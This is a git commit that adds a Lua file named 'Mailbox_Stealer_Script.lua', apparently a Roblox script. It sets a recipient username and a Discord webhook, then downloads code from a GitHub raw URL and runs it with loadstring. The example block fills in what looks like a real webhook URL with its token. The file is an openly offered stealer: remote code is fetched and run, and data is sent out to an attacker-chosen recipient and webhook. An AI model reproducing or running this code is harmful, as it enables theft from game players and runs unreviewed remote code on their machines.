5cafe55bfbeba1bbbfd7c4f00dfb3922d6415f71
Smerpgaming2 <130343293+Smerpgaming2@users.noreply.github.com>
2023-05-27 09:08:21 +0800

    Add files via upload

---
+++ Mailbox_Stealer_Script.lua
@@ -0,0 +1,14 @@
+_G.UserName = "  "
+_G.UserName2 = "  " -- optional
+_G.Webhook = "  " -- optional
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXZcript/main/LypherScripts", true))()
+
+**Example :**
+
+
+_G.UserName = "Lypher_17"
+_G.UserName2 = "Lypher_17" -- optional
+_G.Webhook = "https://discord.com/api/webhooks/1109194507804737647/3vArdqCHO1Ysn3gWdD_4LMfIHNFbqp9b4mKP39xXDiJQjwBtfx0oENtCDSSQyVP3rtM4" -- optional
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXZcript/main/LypherScripts", true))()
